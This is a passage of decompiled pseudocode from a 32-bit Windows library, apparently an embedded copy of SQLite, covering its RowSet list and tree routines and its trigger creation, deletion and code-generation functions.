    *(_DWORD *)(a1 + 16) = result + 2;
    *(_WORD *)(a1 + 24) = 63;
  }
  result = *(_DWORD **)(a1 + 16);
  --*(_WORD *)(a1 + 24);
  *(_DWORD *)(a1 + 16) = result + 4;
  result[2] = 0;
  *(_QWORD *)result = a2;
  v3 = *(_DWORD *)(a1 + 12);
  if ( v3 )
  {
    if ( *(_BYTE *)(a1 + 26) )
    {
      if ( a2 <= *(_QWORD *)v3 )
        *(_BYTE *)(a1 + 26) = 0;
    }
    *(_DWORD *)(v3 + 8) = result;
  }
  else
  {
    *(_DWORD *)(a1 + 8) = result;
  }
  *(_DWORD *)(a1 + 12) = result;
  return result;
}

//----- (10072561) --------------------------------------------------------
int __usercall sub_10072561@<eax>(int a1@<eax>, int a2@<ecx>)
{
  char *v2; // edx
  char v4; // [esp+0h] [ebp-10h] BYREF
  int v5; // [esp+8h] [ebp-8h]

  v2 = &v4;
  if ( !a1 )
    goto LABEL_11;
  while ( a2 )
  {
    if ( *(_QWORD *)a1 >= *(_QWORD *)a2 )
    {
      if ( *(_QWORD *)a2 < *(_QWORD *)a1 )
      {
        *((_DWORD *)v2 + 2) = a2;
        a2 = *(_DWORD *)(a2 + 8);
        v2 = (char *)*((_DWORD *)v2 + 2);
        goto LABEL_6;
      }
    }
    else
    {
      *((_DWORD *)v2 + 2) = a1;
      v2 = (char *)a1;
    }
    a1 = *(_DWORD *)(a1 + 8);
LABEL_6:
    if ( !a1 )
      break;
  }
  if ( !a1 )
  {
LABEL_11:
    *((_DWORD *)v2 + 2) = a2;
    return v5;
  }
  *((_DWORD *)v2 + 2) = a1;
  return v5;
}

//----- (100725BD) --------------------------------------------------------
int __usercall sub_100725BD@<eax>(int a1@<esi>)
{
  int v1; // eax
  int v2; // ebx
  int *v3; // edi
  int result; // eax
  unsigned int i; // ebx
  int v6[40]; // [esp+8h] [ebp-A0h] BYREF

  memset(v6, 0, sizeof(v6));
  while ( *(_DWORD *)(a1 + 8) )
  {
    v1 = *(_DWORD *)(a1 + 8);
    *(_DWORD *)(a1 + 8) = *(_DWORD *)(v1 + 8);
    *(_DWORD *)(v1 + 8) = 0;
    v2 = 0;
    if ( v6[0] )
    {
      v3 = v6;
      do
      {
        v1 = sub_10072561(*v3, v1);
        *v3 = 0;
        v3 = &v6[++v2];
      }
      while ( *v3 );
    }
    v6[v2] = v1;
  }
  result = 0;
  for ( i = 0; i < 0x28; ++i )
    result = sub_10072561(result, v6[i]);
  *(_DWORD *)(a1 + 12) = 0;
  *(_DWORD *)(a1 + 8) = result;
  *(_BYTE *)(a1 + 26) = 1;
  return result;
}
// 100725BD: using guessed type int var_A0[40];

//----- (10072648) --------------------------------------------------------
_DWORD *__cdecl sub_10072648(int a1, _DWORD *a2, _DWORD *a3)
{
  _DWORD *v3; // eax
  int i; // esi
  int v5; // ecx
  _DWORD *result; // eax

  v3 = a2;
  for ( i = a1; ; i = *(_DWORD *)(i + 8) )
  {
    v5 = *(_DWORD *)(i + 12);
    if ( v5 )
    {
      sub_10072648(v5, v3, &a1);
      *(_DWORD *)(a1 + 8) = i;
    }
    else
    {
      *v3 = i;
    }
    v3 = (_DWORD *)(i + 8);
    if ( !*(_DWORD *)(i + 8) )
      break;
  }
  result = a3;
  *a3 = i;
  return result;
}

//----- (10072686) --------------------------------------------------------
int __cdecl sub_10072686(int *a1, int a2)
{
  int result; // eax
  int v3; // esi

  result = *a1;
  if ( *a1 )
  {
    if ( a2 == 1 )
    {
      *a1 = *(_DWORD *)(result + 8);
      *(_DWORD *)(result + 8) = 0;
      *(_DWORD *)(result + 12) = 0;
    }
    else
    {
      result = sub_10072686(a1, a2 - 1);
      v3 = *a1;
      if ( *a1 )
      {
        *(_DWORD *)(v3 + 12) = result;
        *a1 = *(_DWORD *)(v3 + 8);
        *(_DWORD *)(v3 + 8) = sub_10072686(a1, a2 - 1);
        return v3;
      }
    }
  }
  return result;
}

//----- (100726D9) --------------------------------------------------------
int __cdecl sub_100726D9(int a1)
{
  int v1; // edx
  _DWORD *v2; // eax
  int i; // edi
  int v4; // eax
  int v5; // edx
  int *v6; // esi

  v1 = a1;
  v2 = (_DWORD *)(a1 + 8);
  a1 = *(_DWORD *)(a1 + 8);
  *v2 = 0;
  *(_DWORD *)(v1 + 12) = 0;
  for ( i = 1; a1; ++i )
  {
    v4 = v1;
    v5 = a1;
    v6 = (int *)(a1 + 8);
    a1 = *(_DWORD *)(a1 + 8);
    *(_DWORD *)(v5 + 12) = v4;
    *v6 = sub_10072686(&a1, i);
  }
  return v1;
}
// 100726F9: variable 'v1' is possibly undefined

//----- (10072726) --------------------------------------------------------
int __usercall sub_10072726@<eax>(int a1@<eax>)
{
  int result; // eax
  int v3; // ecx
  int v4; // eax
  int v5; // [esp+4h] [ebp-8h] BYREF
  int v6; // [esp+8h] [ebp-4h] BYREF

  if ( !*(_BYTE *)(a1 + 26) )
    sub_100725BD(a1);
  result = *(_DWORD *)(a1 + 20);
  if ( result )
  {
    sub_10072648(result, &v6, &v5);
    v3 = v6;
    v4 = *(_DWORD *)(a1 + 8);
    *(_DWORD *)(a1 + 20) = 0;
    result = sub_10072561(v4, v3);
    *(_DWORD *)(a1 + 8) = result;
  }
  return result;
}

//----- (10072766) --------------------------------------------------------
int __usercall sub_10072766@<eax>(int a1@<eax>, char a2@<bl>, __int64 a3)
{
  int v4; // eax
  unsigned int *i; // esi
  int v6; // eax
  unsigned int v7; // ecx

  if ( a2 != *(_BYTE *)(a1 + 27) )
  {
    if ( *(_DWORD *)(a1 + 8) )
    {
      sub_10072726(a1);
      v4 = sub_100726D9(*(_DWORD *)(a1 + 8));
      *(_DWORD *)(a1 + 8) = 0;
      *(_DWORD *)(a1 + 12) = 0;
      *(_DWORD *)(a1 + 20) = v4;
    }
    *(_BYTE *)(a1 + 27) = a2;
  }
  for ( i = *(unsigned int **)(a1 + 20); ; i = (unsigned int *)i[2] )
  {
    while ( 1 )
    {
      if ( !i )
        return 0;
      v6 = i[1];
      v7 = *i;
      if ( v6 <= SHIDWORD(a3) )
        break;
LABEL_11:
      i = (unsigned int *)i[3];
    }
    if ( v6 >= SHIDWORD(a3) && v7 >= (unsigned int)a3 )
      break;
  }
  if ( __SPAIR64__(v6, v7) > a3 )
    goto LABEL_11;
  return 1;
}

//----- (100727CB) --------------------------------------------------------
void __cdecl sub_100727CB(int a1, unsigned int a2)
{
  unsigned int v2; // ebx
  unsigned int v3; // [esp-10h] [ebp-10h]

  while ( a2 )
  {
    v2 = a2;
    v3 = *(_DWORD *)(a2 + 20);
    a2 = *(_DWORD *)(a2 + 32);
    sub_10075FD8(a1, v3);
    sub_100767B1(*(int **)(v2 + 24), a1);
    sub_1007B016(a1, *(_DWORD *)(v2 + 8));
    sub_1006C5DA(*(unsigned int **)(v2 + 28), a1);
    sub_10058EC7(a1, v2);
  }
}

//----- (1007281E) --------------------------------------------------------
int __usercall sub_1007281E@<eax>(_BYTE *a1@<eax>, int a2@<ebx>)
{
  int v2; // ecx
  int result; // eax
  _DWORD *v4; // edi
  int v5; // esi
  int v6; // eax
  int v7; // [esp+0h] [ebp-4h]

  v7 = 0;
  v2 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)a1 + 8) + 28);
  if ( a1[442] )
    return 0;
  if ( v2 == *(_DWORD *)(a2 + 68) )
    return *(_DWORD *)(a2 + 64);
  v4 = *(_DWORD **)(v2 + 44);
  if ( !v4 )
    return *(_DWORD *)(a2 + 64);
  do
  {
    v5 = v4[2];
    if ( *(_DWORD *)(v5 + 24) == *(_DWORD *)(a2 + 68)
      && !sub_100593BE(*(unsigned __int8 **)(v5 + 4), *(unsigned __int8 **)(a2 + 4)) )
    {
      v6 = v7;
      if ( !v7 )
        v6 = *(_DWORD *)(a2 + 64);
      *(_DWORD *)(v5 + 32) = v6;
      v7 = v5;
    }
    v4 = (_DWORD *)*v4;
  }
  while ( v4 );
  result = v7;
  if ( !v7 )
    return *(_DWORD *)(a2 + 64);
  return result;
}

//----- (10072887) --------------------------------------------------------
void __usercall sub_10072887(
        int *a1@<eax>,
        int a2@<ecx>,
        int *a3,
        int a4,
        char a5,
        unsigned int *a6,
        int a7,
        void **Src,
        int a9,
        int a10)
{
  int v11; // edi
  int *v12; // eax
  int *v13; // eax
  _BYTE *v14; // eax
  _BYTE *v15; // eax
  int v16; // edx
  unsigned __int8 *v17; // ecx
  int v18; // esi
  const char *v19; // eax
  _BYTE *v20; // eax
  _DWORD *v21; // esi
  int *v22[4]; // [esp+Ch] [ebp-24h] BYREF
  int *v23; // [esp+1Ch] [ebp-14h]
  _DWORD *v24; // [esp+20h] [ebp-10h]
  int *v25; // [esp+24h] [ebp-Ch] BYREF
  _BYTE *v26; // [esp+28h] [ebp-8h]
  int v27; // [esp+2Ch] [ebp-4h]
  int v28; // [esp+50h] [ebp+20h]
  int v29; // [esp+50h] [ebp+20h]

  v11 = *a3;
  v24 = 0;
  v26 = 0;
  v27 = v11;
  if ( a9 )
  {
    if ( *(_DWORD *)(a2 + 4) )
    {
      sub_10059320(a3, aTemporaryTrigg);
LABEL_4:
      v11 = v27;
      goto LABEL_39;
    }
    v28 = 1;
    v25 = a1;
  }
  else
  {
    v28 = sub_1006A35E(a2, a3, (int *)&v25, (int)a1);
    if ( v28 < 0 )
      goto LABEL_39;
  }
  if ( a7 && !*(_BYTE *)(v11 + 30) )
  {
    v12 = sub_1008010E(a7, a3);
    if ( !*(_DWORD *)(a2 + 4) && v12 && v12[17] == *(_DWORD *)(*(_DWORD *)(v11 + 8) + 28) )
      v28 = 1;
    if ( !*(_BYTE *)(v11 + 30)
      && (!sub_10078FDE(v22, v28, a3, (int *)aTrigger, v25) || !sub_1007900F((int)v22, (__int16 *)a7)) )
    {
      v13 = sub_1008010E(a7, a3);
      v23 = v13;
      if ( !v13 )
      {
        if ( *(_DWORD *)(v11 + 116) == 1 )
          *(_BYTE *)(v11 + 125) = 1;
        goto LABEL_39;
      }
      if ( (*((_BYTE *)v13 + 34) & 0x10) != 0 )
      {
        sub_10059320(a3, aCannotCreateTr);
        goto LABEL_4;
      }
      v14 = (_BYTE *)sub_1006A297((int)v25, v11);
      v26 = v14;
      if ( !v14 || sub_1006A3D4((int)a3, v14) )
        goto LABEL_39;
      v29 = 16 * v28;
      v15 = sub_10059297(v26);
      if ( sub_10068FF9((int)v15, (_DWORD *)(*(_DWORD *)(*(_DWORD *)(v11 + 8) + v16 + 12) + 36), v17) )
      {
        if ( !a10 )
        {
          sub_10059320(a3, aTriggerTAlread);
          goto LABEL_4;
        }
        goto LABEL_39;
      }
      v18 = (int)v23;
      if ( !sub_100593F9((_BYTE *)v23[1], 7, (unsigned __int8 *)aSqlite_2) )
      {
        sub_10059320(a3, aCannotCreateTr_0);
        ++a3[16];
        goto LABEL_4;
      }
      if ( *(_DWORD *)(v18 + 28) )
      {
        if ( a4 != 48 )
        {
          v19 = aBefore;
          if ( a4 != 34 )
            v19 = aAfter;
          sub_10059320(a3, "cannot create %s trigger on view: %S", v19, (const wchar_t *)a7);
          goto LABEL_33;
        }
        a4 = 34;
      }
      else if ( a4 == 48 )
      {
        sub_10059320(a3, "cannot create INSTEAD OF trigger on table: %S", (const wchar_t *)a7);
LABEL_33:
        v11 = v27;
        goto LABEL_39;
      }
      v24 = sub_1005904B(v11, 0x24u);
      if ( v24 )
      {
        v20 = v26;
        v21 = v24;
        v26 = 0;
        *v24 = v20;
        v21[1] = sub_10059194(*(_BYTE **)(a7 + 12));
        v21[5] = *(_DWORD *)(*(_DWORD *)(v11 + 8) + v29 + 12);
        v21[6] = v23[17];
        *((_BYTE *)v21 + 8) = a5;
        *((_BYTE *)v21 + 9) = (a4 != 34) + 1;
        v21[3] = sub_1007631C(v11, Src, 1);
        v21[4] = sub_1007653B(a6, v11);
        a3[126] = (int)v21;
      }
    }
  }
LABEL_39:
  sub_10058EC7(v11, (unsigned int)v26);
  sub_1006C7F7((__int16 *)a7, v11);
  sub_1006C5DA(a6, v11);
  sub_10075FD8(v11, (unsigned int)Src);
  if ( !a3[126] )
    sub_10072E75(v27, (unsigned int)v24);
}
// 10072A5E: conditional instruction was optimized away because eax.4!=0
// 10072A80: conditional instruction was optimized away because %arg_4.4==30
// 100729C7: variable 'v16' is possibly undefined
// 100729CE: variable 'v17' is possibly undefined

//----- (10072B4C) --------------------------------------------------------
void __cdecl sub_10072B4C(int *a1, unsigned int a2, int a3)
{
  int *v3; // ebx
  int v4; // esi
  int v5; // edi
  unsigned int v6; // eax
  int v7; // esi
  char *v8; // eax
  int v9; // ecx
  unsigned __int16 *v10; // eax
  unsigned __int8 *v11; // edi
  int *v12; // esi
  _BYTE *v13; // eax
  unsigned int *v14; // edx
  _BYTE *v15; // eax
  int v16; // edx
  unsigned __int8 *v17; // ecx
  int *v18; // eax
  unsigned int v19; // edi
  int v20; // ebx
  int *v21[4]; // [esp+Ch] [ebp-30h] BYREF
  _BYTE *v22[2]; // [esp+1Ch] [ebp-20h] BYREF
  int *v23; // [esp+24h] [ebp-18h]
  _DWORD *v24; // [esp+28h] [ebp-14h]
  unsigned __int8 *v25; // [esp+2Ch] [ebp-10h]
  int v26; // [esp+30h] [ebp-Ch]
  int v27; // [esp+34h] [ebp-8h]
  int *v28; // [esp+44h] [ebp+8h]

  v27 = *a1;
  v3 = (int *)a1[126];
  a1[126] = 0;
  if ( !a1[16] && v3 )
  {
    v4 = v3[5];
    v25 = (unsigned __int8 *)*v3;
    v5 = sub_1005855F(v27, v4);
    v6 = a2;
    v26 = v5;
    v3[7] = a2;
    if ( a2 )
    {
      while ( 1 )
      {
        *(_DWORD *)(v6 + 4) = v3;
        a2 = *(_DWORD *)(v6 + 32);
        if ( !a2 )
          break;
        v6 = *(_DWORD *)(v6 + 32);
      }
    }
    v22[0] = (_BYTE *)*v3;
    v22[1] = sub_10059297(v22[0]);
    if ( !sub_10078FDE(v21, v5, a1, (int *)aTrigger_0, (int *)v22) || !sub_100791A3(v3[7], (int)v21) )
    {
      if ( !*(_BYTE *)(v27 + 124) )
      {
        v23 = sub_1007C271(a1);
        if ( !v23 )
          goto LABEL_19;
        sub_1006CB39(a1, v26, 0);
        v7 = v27;
        v24 = sub_100591D0(v27, *(_DWORD *)(a3 + 4), *(void **)a3);
        v8 = aSqliteTempMast_8;
        if ( v26 != 1 )
          v8 = aSqliteMaster_8;
        sub_10069DB8((int)a1, aInsertIntoQSVa_0, *(_DWORD *)(16 * v26 + *(_DWORD *)(v7 + 8)), v8, v25, v3[1], v24);
        sub_10058EC7(v7, (unsigned int)v24);
        sub_1006AB7A(a1, v26);
        v10 = (unsigned __int16 *)sub_10055484(v27, aTypeTriggerAnd, v25, v9);
        sub_1005AC02(v23, 98, v26, 0, 0, v10, (_BYTE *)0xFFFFFFFF);
      }
      if ( *(_BYTE *)(v27 + 124) )
      {
        v11 = v25;
        v12 = v3;
        v28 = v3;
        v13 = sub_10059297(v25);
        v3 = sub_10069032(v14, v11, (int)v13, v3);
        if ( v3 )
        {
          *(_BYTE *)(v27 + 30) = 1;
        }
        else if ( v12[5] == v12[6] )
        {
          v15 = sub_10059297((_BYTE *)v12[1]);
          v18 = sub_10068FF9((int)v15, (_DWORD *)(v16 + 4), v17);
          v28[8] = v18[16];
          v18[16] = (int)v28;
        }
      }
    }
  }
LABEL_19:
  v19 = (unsigned int)v3;
  v20 = v27;
  sub_10072E75(v27, v19);
  sub_100727CB(v20, a2);
}
// 10072C82: variable 'v9' is possibly undefined
// 10072CCB: variable 'v14' is possibly undefined
// 10072CF2: variable 'v16' is possibly undefined
// 10072CF5: variable 'v17' is possibly undefined

//----- (10072D21) --------------------------------------------------------
_DWORD *__usercall sub_10072D21@<eax>(int a1@<edi>, int a2, char a3)
{
  _DWORD *v3; // eax
  _DWORD *v4; // esi
  _DWORD *v5; // ebx

  v3 = sub_1005904B(a2, *(_DWORD *)(a1 + 4) + 40);
  v4 = v3;
  if ( v3 )
  {
    v5 = v3 + 10;
    memcpy(v3 + 10, *(const void **)a1, *(_DWORD *)(a1 + 4));
    v4[3] = v5;
    v4[4] = *(_DWORD *)(a1 + 4);
    *(_BYTE *)v4 = a3;
  }
  return v4;
}

//----- (10072D61) --------------------------------------------------------
_DWORD *__usercall sub_10072D61@<eax>(unsigned int *a1@<eax>, int a2@<ecx>, int a3, int *a4, unsigned int a5, char a6)
{
  _DWORD *v7; // edi

  v7 = sub_10072D21(a2, a3, 105);
  if ( v7 )
  {
    v7[2] = sub_100765C5(a3, a5, 1);
    v7[7] = a1;
    v7[6] = sub_10076339(a4, a3, 1);
    *((_BYTE *)v7 + 1) = a6;
  }
  else
  {
    sub_1006C5DA(a1, a3);
  }
  sub_100767B1(a4, a3);
  sub_1007B016(a3, a5);
  return v7;
}

//----- (10072DD5) --------------------------------------------------------
_DWORD *__usercall sub_10072DD5@<eax>(int *a1@<eax>, int a2@<ecx>, int a3, void **Src, char a5)
{
  _DWORD *v6; // esi

  v6 = sub_10072D21(a2, a3, 107);
  if ( v6 )
  {
    v6[6] = sub_10076339(a1, a3, 1);
    v6[5] = sub_1007631C(a3, Src, 1);
    *((_BYTE *)v6 + 1) = a5;
  }
  sub_100767B1(a1, a3);
  sub_10075FD8(a3, (unsigned int)Src);
  return v6;
}

//----- (10072E36) --------------------------------------------------------
_DWORD *__usercall sub_10072E36@<eax>(int a1@<edi>, int a2, void **Src)
{
  _DWORD *v3; // esi

  v3 = sub_10072D21(a1, a2, 106);
  if ( v3 )
  {
    v3[5] = sub_1007631C(a2, Src, 1);
    *((_BYTE *)v3 + 1) = 99;
  }
  sub_10075FD8(a2, (unsigned int)Src);
  return v3;
}

//----- (10072E75) --------------------------------------------------------
void __usercall sub_10072E75(int a1@<ebx>, unsigned int a2@<edi>)
{
  if ( a2 )
  {
    sub_100727CB(a1, *(_DWORD *)(a2 + 28));
    sub_10058EC7(a1, *(_DWORD *)a2);
    sub_10058EC7(a1, *(_DWORD *)(a2 + 4));
    sub_10075FD8(a1, *(_DWORD *)(a2 + 12));
    sub_1006C5DA(*(unsigned int **)(a2 + 16), a1);
    sub_10058EC7(a1, a2);
  }
}

//----- (10072EB2) --------------------------------------------------------
void __cdecl sub_10072EB2(int *a1, int a2, int a3)
{
  int v3; // esi
  unsigned __int8 *v4; // edi
  int v5; // ebx
  int *v6; // eax
  int v7; // [esp+Ch] [ebp-18h]
  _BYTE *v8; // [esp+10h] [ebp-14h]
  unsigned __int8 *v9; // [esp+14h] [ebp-10h]
  int v10; // [esp+18h] [ebp-Ch]
  int v11; // [esp+1Ch] [ebp-8h]
  int v12; // [esp+20h] [ebp-4h]

  v11 = 0;
  v3 = *a1;
  v10 = *a1;
  if ( !*(_BYTE *)(*a1 + 30) && !sub_10058497(a1) )
  {
    v4 = *(unsigned __int8 **)(a2 + 12);
    v9 = *(unsigned __int8 **)(a2 + 8);
    v12 = 0;
    v8 = sub_10059297(v4);
    v7 = *(_DWORD *)(v3 + 4);
    if ( v7 <= 0 )
    {
LABEL_11:
      if ( !a3 )
        sub_10059320(a1, "no such trigger: %S", (const wchar_t *)a2);
    }
    else
    {
      while ( 1 )
      {
        v5 = v12;
        if ( v12 < 2 )
          v5 = v12 ^ 1;
        if ( !v9 || !sub_100593BE(*(unsigned __int8 **)(16 * v5 + *(_DWORD *)(v3 + 8)), v9) )
        {
          v6 = sub_10068FF9((int)v8, (_DWORD *)(*(_DWORD *)(16 * v5 + *(_DWORD *)(v3 + 8) + 12) + 36), v4);
          v3 = v10;
          v11 = (int)v6;
          if ( v6 )
            break;
        }
        if ( ++v12 >= v7 )
        {
          if ( !v11 )
            goto LABEL_11;
          break;
        }
      }
      sub_10072F93(a1, v11);
    }
  }
  sub_1006C7F7((__int16 *)a2, v3);
}

//----- (10072F93) --------------------------------------------------------
int __usercall sub_10072F93@<eax>(int *a1@<eax>, int a2@<ebx>)
{
  int result; // eax
  int v4; // esi
  int v5; // [esp+Ch] [ebp-8h]
  int *v6; // [esp+10h] [ebp-4h]

  v5 = sub_1005855F(*a1, *(_DWORD *)(a2 + 20));
  result = (int)sub_1007C271(a1);
  v6 = (int *)result;
  if ( result )
  {
    sub_1006CB39(a1, v5, 0);
    sub_1006A2B6(a1, v5);
    v4 = sub_1005AD69(v6, 9, (int)&unk_100FE5F8);
    sub_1005AFA8(v4 + 1, v6, *(unsigned __int16 **)a2, 0);
    sub_1005AFA8(v4 + 4, v6, (unsigned __int16 *)aTrigger_1, (_BYTE *)0xFFFFFFFE);
    sub_1006AB7A(a1, v5);
    sub_1005AB66((int)v6, 42, 0, 0, 0);
    sub_1005AC02(v6, 102, v5, 0, 0, *(unsigned __int16 **)a2, 0);
    result = 3;
    if ( a1[18] < 3 )
      a1[18] = 3;
  }
  return result;
}

//----- (10073048) --------------------------------------------------------
void __fastcall sub_10073048(unsigned __int8 *a1, int a2)
{
  _BYTE *v4; // eax
  unsigned int *v5; // edx
  int *v6; // eax
  unsigned int v7; // edi
  _BYTE *v8; // eax
  int v9; // edx
  unsigned __int8 *v10; // ecx
  int *i; // eax
  int v12; // ecx

  v4 = sub_10059297(a1);
  v6 = sub_10069032(v5, a1, (int)v4, 0);
  v7 = (unsigned int)v6;
  if ( v6 )
  {
    if ( v6[5] == v6[6] )
    {
      v8 = sub_10059297((_BYTE *)v6[1]);
      for ( i = sub_10068FF9((int)v8, (_DWORD *)(v9 + 4), v10) + 16; ; i = (int *)(v12 + 32) )
      {
        v12 = *i;
        if ( *i == v7 )
          break;
      }
      *i = *(_DWORD *)(v12 + 32);
    }
    sub_10072E75(a2, v7);
    *(_DWORD *)(a2 + 12) |= 0x200u;
  }
}
// 10073068: variable 'v5' is possibly undefined
// 10073086: variable 'v9' is possibly undefined
// 10073089: variable 'v10' is possibly undefined

//----- (100730B2) --------------------------------------------------------
int __usercall sub_100730B2@<eax>(int *a1@<eax>, int a2)
{
  int v2; // ebx
  int v3; // edi
  unsigned __int8 **i; // esi

  v2 = 0;
  if ( a2 && a1 )
  {
    v3 = *a1;
    if ( *a1 <= 0 )
      return 0;
    for ( i = (unsigned __int8 **)(a1[3] + 4); sub_1006C617(a2, *i) < 0; i += 5 )
    {
      if ( ++v2 >= v3 )
        return 0;
    }
  }
  return 1;
}

//----- (100730F2) --------------------------------------------------------
int __usercall sub_100730F2@<eax>(_BYTE *a1@<eax>, int a2@<ecx>, int a3, int *a4, _DWORD *a5)
{
  int v5; // edi
  int v6; // ebx
  int i; // esi

  v5 = 0;
  v6 = sub_1007281E(a1, a2);
  for ( i = v6; i; i = *(_DWORD *)(i + 32) )
  {
    if ( *(unsigned __int8 *)(i + 8) == a3 && sub_100730B2(a4, *(_DWORD *)(i + 16)) )
      v5 |= *(unsigned __int8 *)(i + 9);
  }
  if ( a5 )
    *a5 = v5;
  return v5 != 0 ? v6 : 0;
}

//----- (10073145) --------------------------------------------------------
__int16 *__usercall sub_10073145@<eax>(int a1@<eax>, int *a2@<ebx>)
{
  int v3; // edi
  int v4; // eax
  __int16 *v6; // [esp+Ch] [ebp-4h]

  v6 = sub_1006C71D(0, *a2, a1 + 12, 0);
  if ( v6 )
  {
    v3 = *a2;
    v4 = sub_1005855F(*a2, *(_DWORD *)(*(_DWORD *)(a1 + 4) + 20));
    if ( !v4 || v4 >= 2 )
      *(_DWORD *)&v6[28 * *v6 - 24] = sub_10059194(*(_BYTE **)(*(_DWORD *)(v3 + 8) + 16 * v4));
  }
  return v6;
}

//----- (100731A3) --------------------------------------------------------
int __usercall sub_100731A3@<eax>(int a1@<eax>, int a2@<edi>, int a3)
{
  int v3; // ebx
  int v4; // esi
  unsigned __int8 v5; // al
  _DWORD *v6; // ebx
  __int16 *v7; // eax
  __int16 *v8; // eax
  __int16 *v9; // eax
  int *v11; // [esp-10h] [ebp-34h]
  int *v12; // [esp-Ch] [ebp-30h]
  int **v13; // [esp-Ch] [ebp-30h]
  void **v14; // [esp-8h] [ebp-2Ch]
  unsigned int *v15; // [esp-8h] [ebp-2Ch]
  int v16; // [esp-4h] [ebp-28h]
  _DWORD *v17; // [esp-4h] [ebp-28h]
  int v18; // [esp-4h] [ebp-28h]
  unsigned __int8 v19[4]; // [esp+8h] [ebp-1Ch] BYREF
  int v20; // [esp+Ch] [ebp-18h]
  int v21; // [esp+10h] [ebp-14h]
  int v22; // [esp+14h] [ebp-10h]
  int v23; // [esp+18h] [ebp-Ch]
  int v24; // [esp+1Ch] [ebp-8h]

  v3 = *(_DWORD *)a2;
  v4 = a1;
  v23 = *(_DWORD *)(a2 + 12);
  v24 = v3;
  if ( a1 )
  {
    while ( 1 )
    {
      v5 = a3 == 99 ? *(_BYTE *)(v4 + 1) : a3;
      *(_BYTE *)(a2 + 441) = v5;
      switch ( *(_BYTE *)v4 )
      {
        case 'i':
          v18 = v5;
          v15 = sub_1007653B(*(_DWORD **)(v4 + 28), v3);
          v13 = (int **)sub_100765C5(v24, *(_DWORD *)(v4 + 8), 0);
          v11 = (int *)sub_10076339(*(int **)(v4 + 24), v24, 0);
          v9 = sub_10073145(v4, (int *)a2);
          sub_1007967E(a2, (int)v9, v11, v13, v15, v18);
          break;
        case 'j':
          v17 = sub_1007631C(v3, *(void ***)(v4 + 20), 0);
          v8 = sub_10073145(v4, (int *)a2);
          sub_1008027F(a2, (int)v8, v17);
          break;
        case 'k':
          v16 = v5;
          v14 = (void **)sub_1007631C(v3, *(void ***)(v4 + 20), 0);
          v12 = (int *)sub_10076339(*(int **)(v4 + 24), v3, 0);
          v7 = sub_10073145(v4, (int *)a2);
          sub_10084205((int *)a2, (int)v7, v12, v14, v16);
          break;
        default:
          v6 = sub_100765C5(v3, *(_DWORD *)(v4 + 8), 0);
          v20 = 0;
          v19[1] = 0;
          v21 = 0;
          v22 = 0;
          v19[0] = 4;
          sub_1007E480(a2, (_DWORD **)v6, v19);
          sub_1007B016(v24, (unsigned int)v6);
          break;
      }
      if ( *(_BYTE *)v4 != 116 )
        sub_1005ABB9(v23, 57);
      v4 = *(_DWORD *)(v4 + 32);
      if ( !v4 )
        break;
      v3 = v24;
    }
  }
  return 0;
}

//----- (100732F4) --------------------------------------------------------
_DWORD *__cdecl sub_100732F4(int *a1, int a2, int a3, int a4)
{
  int v4; // ebx
  _DWORD *v5; // esi
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  _DWORD *v9; // ebx
  void **v10; // eax
  unsigned __int8 *v11; // edi
  _DWORD *v12; // edi
  _DWORD *v13; // esi
  int v14; // edi
  _DWORD *v15; // eax
  int v16; // edx
  _DWORD *v17; // ecx
  int v18; // eax
  int v19[9]; // [esp+Ch] [ebp-3Ch] BYREF
  _DWORD *v20; // [esp+30h] [ebp-18h]
  int v21; // [esp+34h] [ebp-14h]
  _DWORD *v22; // [esp+38h] [ebp-10h]
  int *v23; // [esp+3Ch] [ebp-Ch]
  int v24; // [esp+40h] [ebp-8h]
  _DWORD *v25; // [esp+44h] [ebp-4h]

  v23 = (int *)a1[106];
  if ( !v23 )
    v23 = a1;
  v4 = *a1;
  v21 = 0;
  v24 = v4;
  v5 = sub_1005904B(v4, 0x18u);
  v22 = v5;
  if ( !v5 )
    return 0;
  v7 = v23 + 135;
  v5[5] = v23[135];
  *v7 = v5;
  v8 = sub_1005904B(v4, 0x18u);
  v20 = v8;
  v5[2] = v8;
  if ( !v8 )
    return 0;
  v8[4] = 1;
  v5[3] = -1;
  v5[4] = -1;
  v5[1] = a4;
  *v5 = a2;
  v9 = sub_1005904B(v4, 0x220u);
  if ( !v9 )
    return 0;
  memset(v19, 0, sizeof(v19));
  v19[0] = (int)v9;
  *v9 = v24;
  v9[107] = a3;
  v9[106] = v23;
  v9[127] = *(_DWORD *)a2;
  *((_BYTE *)v9 + 440) = *(_BYTE *)(a2 + 8);
  v25 = sub_1007C271(v9);
  if ( v25 )
  {
    v10 = *(void ***)(a2 + 12);
    if ( v10 )
    {
      v11 = (unsigned __int8 *)sub_1007631C(v24, v10, 0);
      if ( !sub_1008003C((int)v11, (int)v19) && !*(_BYTE *)(v24 + 30) )
      {
        v21 = sub_1005AC63((int)v25);
        sub_100783F1(v9, v11, v21, 8);
      }
      sub_10075FD8(v24, (unsigned int)v11);
      v5 = v22;
    }
    sub_100731A3(*(_DWORD *)(a2 + 28), (int)v9, a4);
    if ( v21 )
      sub_1005ACAF((int)v25, v21);
    v12 = v25;
    sub_1005ABB9((int)v25, 6);
    if ( a1[16] )
    {
      sub_10058EC7(*v9, v9[2]);
    }
    else
    {
      a1[2] = v9[2];
      a1[16] = v9[16];
    }
    if ( !*(_BYTE *)(v24 + 30) )
    {
      v13 = v25;
      v14 = v12[5];
      sub_1005ACC5((int)v25, v23 + 105);
      v15 = v13;
      v16 = v13[3];
      v5 = v22;
      v17 = v20;
      v20[1] = v16;
      v15[5] = 0;
      *v17 = v14;
    }
    v18 = (int)v20;
    v20[2] = v9[18];
    *(_DWORD *)(v18 + 12) = v9[17];
    *(_DWORD *)(v18 + 20) = a2;
    v5[3] = v9[108];
    v5[4] = v9[109];
    sub_1005BDCB((unsigned int)v25);
    v5 = v22;
  }
  sub_10058EC7(v24, (unsigned int)v9);
  return v5;
}

//----- (100734EB) --------------------------------------------------------
_DWORD *__cdecl sub_100734EB(int *a1, int a2, int a3, int a4)
{
  int *v4; // eax
  _DWORD *result; // eax

  v4 = (int *)a1[106];
  if ( !v4 )
    v4 = a1;
  result = (_DWORD *)v4[135];
  if ( !result )
    return sub_100732F4(a1, a2, a3, a4);
  do
  {
    if ( *result == a2 && result[1] == a4 )
      break;
    result = (_DWORD *)result[5];
  }
  while ( result );
  if ( !result )
    return sub_100732F4(a1, a2, a3, a4);
  return result;
}

//----- (10073539) --------------------------------------------------------
